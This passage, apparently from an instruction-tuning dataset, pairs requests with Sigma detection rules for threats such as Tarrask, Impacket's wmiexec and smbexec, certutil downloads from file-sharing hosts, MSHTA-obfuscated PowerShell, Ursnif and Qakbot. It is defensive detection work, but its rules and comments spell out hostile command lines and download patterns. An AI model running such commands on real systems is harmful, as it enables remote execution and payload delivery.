      "answer": "In order to detect remote PowerShell sessions by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session), you should monitor Windows process creation logs for entries where the process image or its parent image ends with '\\wsmprovhost.exe'. It's essential to pay attention to the computer name, user, and command line used in the creation of these processes. However, be aware that there may be false positives, such as the legitimate usage of remote PowerShell, for instance, for monitoring purposes. This monitoring has a medium importance level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task. This technique is used by Tarrask malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task, a technique used by Tarrask malware, you should: Monitor the Windows Registry for deletion events specifically targeting keys. Focus on detecting when the `DeleteKey` event type is identified within the registry deletion logs. It is crucial to watch for alterations to objects that include the `\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\` path in conjunction with 'SD'. These specific actions are indicative of attempts to manipulate scheduled tasks by removing their security descriptors, thus hiding them from routine scrutiny. Be aware that there may be unknown scenarios leading to false positives. This detection process is of a medium priority level and aligns with tactics and techniques related to the modification or manipulation of system processes to conceal unauthorized or malicious tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_delete\ndetection:\n    selection:\n        EventType: DeleteKey\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\'\n            - 'SD'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_delete\ndetection:\n    selection:\n        EventType: DeleteKey\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\'\n            - 'SD'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task. This technique is used by Tarrask malware",
      "answer": "In order to remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task, a technique used by Tarrask malware, you should: Monitor the Windows Registry for deletion events specifically targeting keys. Focus on detecting when the `DeleteKey` event type is identified within the registry deletion logs. It is crucial to watch for alterations to objects that include the `\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\` path in conjunction with 'SD'. These specific actions are indicative of attempts to manipulate scheduled tasks by removing their security descriptors, thus hiding them from routine scrutiny. Be aware that there may be unknown scenarios leading to false positives. This detection process is of a medium priority level and aligns with tactics and techniques related to the modification or manipulation of system processes to conceal unauthorized or malicious tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a Microsoft Cloud App Security reported a user has deleted an unusual large volume of files, you should: Monitor logs from the threat management service specifically for Microsoft 365 products. Focus on identifying events sourced from the SecurityComplianceCenter that are labeled with the event name 'Unusual volume of file deletion' and have a status of 'success'. This approach aims to catch activities where there might be an exceptional number of file deletions happening which is not a common behavior and could indicate a potential security threat or compromise. The level of concern for such detections is considered medium and while it might result in false positives, whose sources are unknown, it's crucial not to overlook these alerts without proper investigation. This monitoring strategy aligns with identifying suspicious behavior that could signify data destruction or exfiltration methods often associated with cybersecurity threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'Unusual volume of file deletion'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'Unusual volume of file deletion'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files.",
      "answer": "In order to detect when a Microsoft Cloud App Security reported a user has deleted an unusual large volume of files, you should: Monitor logs from the threat management service specifically for Microsoft 365 products. Focus on identifying events sourced from the SecurityComplianceCenter that are labeled with the event name 'Unusual volume of file deletion' and have a status of 'success'. This approach aims to catch activities where there might be an exceptional number of file deletions happening which is not a common behavior and could indicate a potential security threat or compromise. The level of concern for such detections is considered medium and while it might result in false positives, whose sources are unknown, it's crucial not to overlook these alerts without proper investigation. This monitoring strategy aligns with identifying suspicious behavior that could signify data destruction or exfiltration methods often associated with cybersecurity threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of certutil with certain flags that allow the utility to download files from file-sharing websites..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of certutil with certain flags that allow the utility to download files from file-sharing websites, you should: Monitor for the creation of processes associated with the Windows operating system. Specifically, keep an eye out for processes that are either named 'certutil.exe' or have the original filename 'CertUtil.exe'. Furthermore, examine the command line arguments of these processes for indicators that certutil is being used with flags pertaining to 'urlcache' or 'verifyctl', which are commonly employed to download or verify files. Moreover, it's critical to scrutinize the command line for URLs that point to a variety of file-sharing websites known for their use in distributing malicious content. These websites include, but are not limited to, ghostbin, hastebin, paste.ee, anonfiles, Discord\u2019s CDN, ddns.net, GitHub gists, mediafire, mega.nz, pastebin, and several others. The presence of any of these elements in the process creation logs for Windows machines signals a high probability of an attempt to misuse certutil for downloading potentially harmful files, warranting further investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains:\n            - '.ghostbin.co/'\n            - '.hastebin.com'\n            - '.paste.ee'\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com/attachments/'\n            - 'ddns.net'\n            - 'gist.githubusercontent.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'raw.githubusercontent.com'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'transfer.sh'\n            - 'ufile.io'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_flags:\n        CommandLine|contains:\n            - 'urlcache '\n            - 'verifyctl '\n    selection_http:\n        CommandLine|contains:\n            - '.ghostbin.co/'\n            - '.hastebin.com'\n            - '.paste.ee'\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com/attachments/'\n            - 'ddns.net'\n            - 'gist.githubusercontent.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'raw.githubusercontent.com'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'transfer.sh'\n            - 'ufile.io'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of certutil with certain flags that allow the utility to download files from file-sharing websites.",
      "answer": "In order to detect the execution of certutil with certain flags that allow the utility to download files from file-sharing websites, you should: Monitor for the creation of processes associated with the Windows operating system. Specifically, keep an eye out for processes that are either named 'certutil.exe' or have the original filename 'CertUtil.exe'. Furthermore, examine the command line arguments of these processes for indicators that certutil is being used with flags pertaining to 'urlcache' or 'verifyctl', which are commonly employed to download or verify files. Moreover, it's critical to scrutinize the command line for URLs that point to a variety of file-sharing websites known for their use in distributing malicious content. These websites include, but are not limited to, ghostbin, hastebin, paste.ee, anonfiles, Discord\u2019s CDN, ddns.net, GitHub gists, mediafire, mega.nz, pastebin, and several others. The presence of any of these elements in the process creation logs for Windows machines signals a high probability of an attempt to misuse certutil for downloading potentially harmful files, warranting further investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting wmiexec/dcomexec/atexec/smbexec from Impacket framework.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect wmiexec/dcomexec/atexec/smbexec from Impacket framework, you should: monitor the creation of processes on Windows systems, paying special attention to specific parent-child process relationships and command line patterns that are indicative of these attack techniques. Look for instances where the parent process is 'wmiprvse.exe' signaling a potential use of wmiexec, 'mmc.exe' for possible dcomexec using MMC object, 'explorer.exe' for dcomexec with ShellBrowserWindow object, and 'services.exe' for smbexec scenario. These executables executing commands that include 'cmd.exe' combined with the parameters '/Q' and '/c', and specifically making network connections to the localhost address '\\\\\\\\127.0.0.1\\\\' followed by redirection '&1', are strong indicators of the described attack techniques being employed. \n\nAdditionally, watch for command line executions stemming from 'svchost.exe -k netsvcs' and 'taskeng.exe' as these may indicate the use of atexec on different versions of Windows (Windows 10 and Windows 7 respectively). These commands will also involve 'cmd.exe', use '/C' for command execution, attempt to write to 'Windows\\Temp\\' directory, and include '&1' in their command structure.\n\nMonitoring and analyzing these specific parent-child process relationships and command line arguments across the system with vigilance can strongly aid in the identification of suspicious activities that align with wmiexec, dcomexec, atexec, and smbexec attacks as part of the Impacket framework usage. This proactive surveillance is crucial, given the high threat level of such activities, albeit with a mindfulness towards the potential for false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_other:\n        # *** wmiexec.py\n        #    parent is wmiprvse.exe\n        #    examples:\n        #       cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        #       cmd.exe /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        # *** dcomexec.py -object MMC20\n        #   parent is mmc.exe\n        #   example:\n        #       \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567442499.05 2>&1\n        # *** dcomexec.py -object ShellBrowserWindow\n        #  runs %SystemRoot%\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe\n        #  example:\n        #   \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1567520103.71 2>&1\n        # *** smbexec.py\n        #   parent is services.exe\n        #   example:\n        #       C:\\Windows\\system32\\cmd.exe /Q /c echo tasklist ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat\n        ParentImage|endswith:\n            - '\\wmiprvse.exe'        # wmiexec\n            - '\\mmc.exe'        # dcomexec MMC\n            - '\\explorer.exe'        # dcomexec ShellBrowserWindow\n            - '\\services.exe'        # smbexec\n        CommandLine|contains|all:\n            - 'cmd.exe'\n            - '/Q'\n            - '/c'\n            - '\\\\\\\\127.0.0.1\\\\'\n            - '&1'\n    selection_atexec:\n        ParentCommandLine|contains:\n            - 'svchost.exe -k netsvcs'       # atexec on win10 (parent is \"C:\\Windows\\system32\\svchost.exe -k netsvcs\")\n            - 'taskeng.exe'       # atexec on win7 (parent is \"taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\\System:Service:\")\n            # cmd.exe /C tasklist /m > C:\\Windows\\Temp\\bAJrYQtL.tmp 2>&1\n        CommandLine|contains|all:\n            - 'cmd.exe'\n            - '/C'\n            - 'Windows\\Temp\\'\n            - '&1'\n    condition: 1 of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_other:\n        # *** wmiexec.py\n        #    parent is wmiprvse.exe\n        #    examples:\n        #       cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        #       cmd.exe /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        # *** dcomexec.py -object MMC20\n        #   parent is mmc.exe\n        #   example:\n        #       \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567442499.05 2>&1\n        # *** dcomexec.py -object ShellBrowserWindow\n        #  runs %SystemRoot%\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe\n        #  example:\n        #   \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1567520103.71 2>&1\n        # *** smbexec.py\n        #   parent is services.exe\n        #   example:\n        #       C:\\Windows\\system32\\cmd.exe /Q /c echo tasklist ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat\n        ParentImage|endswith:\n            - '\\wmiprvse.exe'        # wmiexec\n            - '\\mmc.exe'        # dcomexec MMC\n            - '\\explorer.exe'        # dcomexec ShellBrowserWindow\n            - '\\services.exe'        # smbexec\n        CommandLine|contains|all:\n            - 'cmd.exe'\n            - '/Q'\n            - '/c'\n            - '\\\\\\\\127.0.0.1\\\\'\n            - '&1'\n    selection_atexec:\n        ParentCommandLine|contains:\n            - 'svchost.exe -k netsvcs'       # atexec on win10 (parent is \"C:\\Windows\\system32\\svchost.exe -k netsvcs\")\n            - 'taskeng.exe'       # atexec on win7 (parent is \"taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\\System:Service:\")\n            # cmd.exe /C tasklist /m > C:\\Windows\\Temp\\bAJrYQtL.tmp 2>&1\n        CommandLine|contains|all:\n            - 'cmd.exe'\n            - '/C'\n            - 'Windows\\Temp\\'\n            - '&1'\n    condition: 1 of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "wmiexec/dcomexec/atexec/smbexec from Impacket framework",
      "answer": "In order to detect wmiexec/dcomexec/atexec/smbexec from Impacket framework, you should: monitor the creation of processes on Windows systems, paying special attention to specific parent-child process relationships and command line patterns that are indicative of these attack techniques. Look for instances where the parent process is 'wmiprvse.exe' signaling a potential use of wmiexec, 'mmc.exe' for possible dcomexec using MMC object, 'explorer.exe' for dcomexec with ShellBrowserWindow object, and 'services.exe' for smbexec scenario. These executables executing commands that include 'cmd.exe' combined with the parameters '/Q' and '/c', and specifically making network connections to the localhost address '\\\\\\\\127.0.0.1\\\\' followed by redirection '&1', are strong indicators of the described attack techniques being employed. \n\nAdditionally, watch for command line executions stemming from 'svchost.exe -k netsvcs' and 'taskeng.exe' as these may indicate the use of atexec on different versions of Windows (Windows 10 and Windows 7 respectively). These commands will also involve 'cmd.exe', use '/C' for command execution, attempt to write to 'Windows\\Temp\\' directory, and include '&1' in their command structure.\n\nMonitoring and analyzing these specific parent-child process relationships and command line arguments across the system with vigilance can strongly aid in the identification of suspicious activities that align with wmiexec, dcomexec, atexec, and smbexec attacks as part of the Impacket framework usage. This proactive surveillance is crucial, given the high threat level of such activities, albeit with a mindfulness towards the potential for false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use MSHTA in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Identify instances where certain command-line parameters appear together in the logs of process creation events on Windows systems. Specifically, look for occurrences where the command line includes all of the following elements: 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)'. This combination suggests an attempt to execute obfuscated PowerShell scripts using MSHTA, a technique that attackers might use to bypass security measures and execute malicious code. It's important to note that there may be unknown false positives, indicating that not all detections might be malicious. However, given the high threat level associated with this behavior, any detection should be closely analyzed. This activity is aligned with tactics and techniques like Execution, Command and Scripting Interpreter, and Windows Management Instrumentation that attackers use for executing code on a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use MSHTA in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Identify instances where certain command-line parameters appear together in the logs of process creation events on Windows systems. Specifically, look for occurrences where the command line includes all of the following elements: 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)'. This combination suggests an attempt to execute obfuscated PowerShell scripts using MSHTA, a technique that attackers might use to bypass security measures and execute malicious code. It's important to note that there may be unknown false positives, indicating that not all detections might be malicious. However, given the high threat level associated with this behavior, any detection should be closely analyzed. This activity is aligned with tactics and techniques like Execution, Command and Scripting Interpreter, and Windows Management Instrumentation that attackers use for executing code on a compromised system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting registry keys related to Ursnif malware..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect registry keys related to Ursnif malware, you should monitor for the creation of new registry keys within Windows, specifically targeting instances where the registry category indicates an addition to the registry. Look for events where a new registry key creation (EventType: CreateKey) is detected, especially those that involve path strings containing '\\Software\\AppDataLow\\Software\\Microsoft\\'. However, to improve precision and reduce false alarms, it is crucial to exclude any events that involve the creation of keys under the paths that include '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\', '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\', '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\', or '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\'. This focused approach helps in isolating registry key creations that are more likely to be associated with malicious activities, particularly those that could be linked to the Ursnif malware, a prevalent threat. While there may still be unknown false positives, given the high level of specificity in the detection criteria, any match should be treated with a high degree of suspicion and investigated accordingly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_add\ndetection:\n    selection:\n        EventType: CreateKey\n        TargetObject|contains: '\\Software\\AppDataLow\\Software\\Microsoft\\'\n    filter:\n        TargetObject|contains:\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_add\ndetection:\n    selection:\n        EventType: CreateKey\n        TargetObject|contains: '\\Software\\AppDataLow\\Software\\Microsoft\\'\n    filter:\n        TargetObject|contains:\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\'\n            - '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "registry keys related to Ursnif malware.",
      "answer": "In order to detect registry keys related to Ursnif malware, you should monitor for the creation of new registry keys within Windows, specifically targeting instances where the registry category indicates an addition to the registry. Look for events where a new registry key creation (EventType: CreateKey) is detected, especially those that involve path strings containing '\\Software\\AppDataLow\\Software\\Microsoft\\'. However, to improve precision and reduce false alarms, it is crucial to exclude any events that involve the creation of keys under the paths that include '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\', '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\', '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\', or '\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\'. This focused approach helps in isolating registry key creations that are more likely to be associated with malicious activities, particularly those that could be linked to the Ursnif malware, a prevalent threat. While there may still be unknown false positives, given the high level of specificity in the detection criteria, any match should be treated with a high degree of suspicion and investigated accordingly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling, deleting and updating of a Trail.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling, deleting, and updating of a Trail, you should: Monitor AWS CloudTrail logs for specific event activities including StopLogging, UpdateTrail, and DeleteTrail actions. These activities are indicative of attempts to manipulate or interfere with the logging mechanisms, which may suggest a malicious actor's intent to evade detection. It's important to note that there could be legitimate reasons for these actions, such as valid changes in the configuration of a Trail, hence any alerts should be investigated to differentiate between benign and malicious behavior. The detection focuses on levering CloudTrail data, specifically looking for events generated by AWS services that indicate the mentioned actions. This approach is essential for maintaining the integrity of log management and monitoring practices within AWS environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: cloudtrail.amazonaws.com\n        eventName:\n            - StopLogging\n            - UpdateTrail\n            - DeleteTrail\n    condition: selection_source\nfalsepositives:\n    - Valid change in a Trail\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: cloudtrail.amazonaws.com\n        eventName:\n            - StopLogging\n            - UpdateTrail\n            - DeleteTrail\n    condition: selection_source\nfalsepositives:\n    - Valid change in a Trail\nlevel: medium\n",
      "question": "disabling, deleting and updating of a Trail",
      "answer": "In order to detect disabling, deleting, and updating of a Trail, you should: Monitor AWS CloudTrail logs for specific event activities including StopLogging, UpdateTrail, and DeleteTrail actions. These activities are indicative of attempts to manipulate or interfere with the logging mechanisms, which may suggest a malicious actor's intent to evade detection. It's important to note that there could be legitimate reasons for these actions, such as valid changes in the configuration of a Trail, hence any alerts should be investigated to differentiate between benign and malicious behavior. The detection focuses on levering CloudTrail data, specifically looking for events generated by AWS services that indicate the mentioned actions. This approach is essential for maintaining the integrity of log management and monitoring practices within AWS environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity, you should: \n\nFocus on monitoring Windows system logs, specifically those related to the creation of processes. Keep an eye out for instances where well-known system processes such as 'cmd.exe', 'cscript.exe', 'curl.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', and 'wscript.exe' are parents to the 'rundll32.exe' process. This combination of parent and child processes is unusual under normal operation circumstances and has been associated with the behavior of the Qakbot malware. Additionally, pay attention to 'rundll32.exe' processes that originate with command lines containing specific paths known to be utilized by Qakbot, such as directories within 'ProgramData', 'Users\\Public', 'AppData\\Local\\Temp', and 'AppData\\Roaming'. \n\nMoreover, scrutinize the 'rundll32.exe' processes for command lines that end with particular exports indicative of Qakbot\u2019s malicious activities. These exports include, but are not limited to, 'aslr', 'bind', 'DrawThemeIcon', 'GG10', 'GL70', 'jhbvygftr', 'kjhbhkjvydrt', 'LS88', 'Motd', 'N115', 'next', 'Nikn', 'print', 'qqqb', 'qqqq', 'RS32', 'Test', 'Time', 'Updt', 'vips', 'Wind', 'WW50', 'X555', 'XL55', 'xlAutoOpen', and 'XS88'. \n\nThe detection of these paths and exports, especially when found in conjunction with each other, is critical. Spawning of 'rundll32.exe' with these peculiar characteristics is an indicator of compromise and suggests the presence of Qakbot malware within the system. Given the sophistication and potentially severe impact of a Qakbot infection, such detections are treated with a high level of suspicion, and the likelihood of false positives is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_paths:\n        ParentImage|endswith:\n            # Note: Only add processes seen used by Qakbot to avoid collision with other strains of malware\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            # Note: Only add paths seen used by Qakbot to avoid collision with other strains of malware\n            - ':\\ProgramData\\'\n            - ':\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    selection_exports:\n        CommandLine|endswith:\n            # Note: Only add additional exports seen used by Qakbot\n            - 'aslr' # https://tria.ge/230524-scgq9add9v/behavioral1#report\n            - 'bind'\n            - 'DrawThemeIcon'\n            - 'GG10'\n            - 'GL70'\n            - 'jhbvygftr'\n            - 'kjhbhkjvydrt'\n            - 'LS88'\n            - 'Motd'\n            - 'N115'\n            - 'next' # https://tria.ge/230530-n3rxpahf9w/behavioral2\n            - 'Nikn'\n            - 'print'\n            - 'qqqb'\n            - 'qqqq'\n            - 'RS32'\n            - 'Test'\n            - 'Time'\n            - 'Updt'\n            - 'vips'\n            - 'Wind'\n            - 'WW50'\n            - 'X555'\n            - 'XL55'\n            - 'xlAutoOpen'\n            - 'XS88'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_paths:\n        ParentImage|endswith:\n            # Note: Only add processes seen used by Qakbot to avoid collision with other strains of malware\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            # Note: Only add paths seen used by Qakbot to avoid collision with other strains of malware\n            - ':\\ProgramData\\'\n            - ':\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    selection_exports:\n        CommandLine|endswith:\n            # Note: Only add additional exports seen used by Qakbot\n            - 'aslr' # https://tria.ge/230524-scgq9add9v/behavioral1#report\n            - 'bind'\n            - 'DrawThemeIcon'\n            - 'GG10'\n            - 'GL70'\n            - 'jhbvygftr'\n            - 'kjhbhkjvydrt'\n            - 'LS88'\n            - 'Motd'\n            - 'N115'\n            - 'next' # https://tria.ge/230530-n3rxpahf9w/behavioral2\n            - 'Nikn'\n            - 'print'\n            - 'qqqb'\n            - 'qqqq'\n            - 'RS32'\n            - 'Test'\n            - 'Time'\n            - 'Updt'\n            - 'vips'\n            - 'Wind'\n            - 'WW50'\n            - 'X555'\n            - 'XL55'\n            - 'xlAutoOpen'\n            - 'XS88'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity.",
      "answer": "In order to detect specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity, you should: \n\nFocus on monitoring Windows system logs, specifically those related to the creation of processes. Keep an eye out for instances where well-known system processes such as 'cmd.exe', 'cscript.exe', 'curl.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', and 'wscript.exe' are parents to the 'rundll32.exe' process. This combination of parent and child processes is unusual under normal operation circumstances and has been associated with the behavior of the Qakbot malware. Additionally, pay attention to 'rundll32.exe' processes that originate with command lines containing specific paths known to be utilized by Qakbot, such as directories within 'ProgramData', 'Users\\Public', 'AppData\\Local\\Temp', and 'AppData\\Roaming'. \n\nMoreover, scrutinize the 'rundll32.exe' processes for command lines that end with particular exports indicative of Qakbot\u2019s malicious activities. These exports include, but are not limited to, 'aslr', 'bind', 'DrawThemeIcon', 'GG10', 'GL70', 'jhbvygftr', 'kjhbhkjvydrt', 'LS88', 'Motd', 'N115', 'next', 'Nikn', 'print', 'qqqb', 'qqqq', 'RS32', 'Test', 'Time', 'Updt', 'vips', 'Wind', 'WW50', 'X555', 'XL55', 'xlAutoOpen', and 'XS88'. \n\nThe detection of these paths and exports, especially when found in conjunction with each other, is critical. Spawning of 'rundll32.exe' with these peculiar 